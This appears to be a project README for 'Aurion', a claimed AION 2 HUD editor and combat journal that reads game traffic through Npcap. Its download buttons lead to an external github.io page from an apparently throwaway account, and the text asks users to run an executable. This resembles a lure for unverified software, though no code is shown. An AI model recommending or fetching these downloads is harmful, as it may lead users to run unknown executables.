<div align="center">

# 🛡️ Aurion — Custom HUD Editor & Combat Journal for AION 2

![preview](https://raw.githubusercontent.com/nkosilathindlovu288-oss/aurion-hud-combat-journal/main/hero_df4e.svg)

[![downloads](https://img.shields.io/badge/downloads-48K-ec4899?style=plastic&labelColor=3a3a3a)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=plastic&labelColor=3a3a3a)]() [![platform](https://img.shields.io/badge/platform-Windows_11-ec4899?style=plastic&labelColor=3a3a3a)]()

[![Download](https://raw.githubusercontent.com/nkosilathindlovu288-oss/aurion-hud-combat-journal/main/launch_8933.svg)](https://nkosilathindlovu288-oss.github.io/aurion-hud-combat-journal/)

</div>

---

Aurion is a standalone overlay for AION 2 built for players who would rather shape their interface than accept the one they're given. Lay out icons, bars, and text in a live HUD editor, wire them to triggers and conditions so each element appears exactly when it matters, and follow cooldowns, buffs, and casts without breaking your reading of the fight. When the dust settles, the combat journal breaks down damage, healing, and every event in between, with history, charts, and fight comparisons for the numbers-minded among you. It reads incoming game traffic alone—no memory reading, no touching game files—so your tinkering stays in the realm of the creative, not the meddlesome.

## Features

**HUD editor** — Every element is yours to place: icons, bars, text, layers, and groups that stack in whatever order you like. Nudge something a pixel at a time, lock a layout to a corner, then swap entire arrangements for different fights — all through the same in-app editor.

**Skills & effects** — Watch buffs, debuffs, stacks, cooldowns, chains, and cast bars as they happen. Track what matters per skill, set how each effect is drawn, and let Aurion surface the uptime and cooldown states that drive your rotation.

**Triggers** — Decide what shows up and when. Combine conditions on classes, targets, skills, and timing so each element appears only under the circumstances you care about — not a moment sooner.

**Combat journal** — Review DPS and HPS, browse combat history, read the charts, compare fights side by side, and export the numbers to CSV when you want to dig into them another way.

**Profiles** — Build once, share anywhere. Import and export profiles, keep translations handy, and let layouts scale with your screen so a HUD you tuned at one resolution still looks right at another.

**Aurion reads game traffic, never game memory** — No memory reads, no file edits, no hooks into the client. The overlay sits above the game and reports what it sees so you can tune your HUD freely.

Party support is experimental — treat it as a preview while it matures.

Screenshots of the editor, a combat simulation, and a journal analysis are available in the repository's docs.

## Installation

Before Aurion can paint its first pixel over your screen, you need two companions already waiting on your system: the **Npcap** packet capture driver (the ears that let Aurion listen to the game's whispers) and **Microsoft Edge WebView2** (the canvas on which your HUD is drawn). If either is missing, Aurion will politely refuse to wake up.

- Lure Npcap in first — the installer will offer a "WinPcap compatibility" option, and checking it will save you a headache later when Aurion is trying to catch every packet.
- Unpack the Aurion archive wherever you like; keeping it in a cozy folder with room to grow is fine, and so is leaving it among the releases. Launch **aurion.exe** and let it stretch its legs.
- Fire up AION 2 and step into the world. Within moments Aurion will start sniffing out data and the numbers will begin to dance across your HUD — no configuration, no ceremony.
- Open the editor from the toolbar or the system tray icon. Import one of the community profiles or build your own from scratch, adjust every bar and trigger to taste, and seal your work with Ctrl + S. Your layout is now yours to keep.

There is a small quirk of fate to know about: if Aurion wakes up *after* your character is already standing in the world, it may not yet know which class it is looking at. The cure is simple — cast any class-specific skill, and Aurion will recognize your discipline and load the matching HUDs. If your character data still feels half-lit, just leave Aurion running and re-enter the world once more; the full snapshot will arrive on the second pass.

For the finer details — permission prompts, Npcap device selection, and the keyboard shortcuts that make the editor sing — the user guide is your lantern. But for now, the two drivers, one executable, and a quick skill cast are all that stand between you and a HUD that finally looks the way you always imagined it.

## Example Profile

**Cleric · Mirrored HUD** — a ready-made example that shows what the editor can do.

It puts your player frame on one side and the target frame on the other, both built from the same icon, bar, and text elements you can drag around in the editor. Health and mana bars sit under the portraits, active skills and cooldowns line up in a row, buffs and debuffs stack beneath them, party frames tuck into a corner, and a recent skill history feed keeps the last few casts visible for quick reference.

Nothing about this profile is hardcoded. Every element is a trigger, a condition, or a layer you can open, inspect, duplicate, and remix. Rename a group, swap an icon, move a bar, or strip it down to just health and skills — it's a starting point, not a cage.

The Mirrored layout works well for healers who want to keep an eye on both sides of the fight without turning their head, but the same building blocks suit any playstyle. Make it yours, save it under a new name, and you've got your own profile ready to export and share.

Previews and the profile itself live in the example docs, so you can see how it looks in combat before importing.

## Found a Problem or Have an Idea?

Spotted a glitch in your HUD mid-raid? A trigger that fires when it shouldn't, a bar that refuses to fill, or a combat journal entry that looks like it was written by a confused Shugo? Maybe you've got a brilliant idea for a new element type, a smarter condition, or a quality-of-life tweak that would make Aurion sing. Either way — we want to hear it.

Head to the repository's **Issues** tab and open a bug report or feature request (English or Russian, whichever feels natural). The more detail you bring, the faster we can work our modding magic:

- Your Aurion version and what you were doing in AION 2.
- What you expected versus what actually happened.
- Steps to repeat the problem — the shorter the path, the better.
- A screenshot or short clip is worth a thousand log lines, especially for HUD layout quirks.

Ideas are just as welcome as bug reports. If you've dreamed up a trigger, a journal view, or a profile feature that would sharpen your combat awareness, sketch it out and send it our way. Every suggestion from the community helps Aurion grow sharper with each update.

## License

Aurion is free software under the GNU General Public License v3.0 or any later version. Share it, remix it, fold it into your own HUD toolkit, ship it to your guild. If you tweak the code and pass it along, pass the source along too. That is the whole bargain: the workshop stays open for the next modder.

Bundled fonts keep their own licenses — SIL Open Font License 1.1, plus the Ubuntu Font Licence 1.0 for Ubuntu Sans. The license texts sit right beside each font in the renderer's fonts folder, so attribution stays where it belongs.

Aurion is an independent fan project, not affiliated with or endorsed by NCSOFT. AION 2, its names, and its game assets belong to their owners. Third-party tools may conflict with the game's terms of service; use Aurion at your own risk.

[![Download](https://raw.githubusercontent.com/nkosilathindlovu288-oss/aurion-hud-combat-journal/main/launch_8933.svg)](https://nkosilathindlovu288-oss.github.io/aurion-hud-combat-journal/)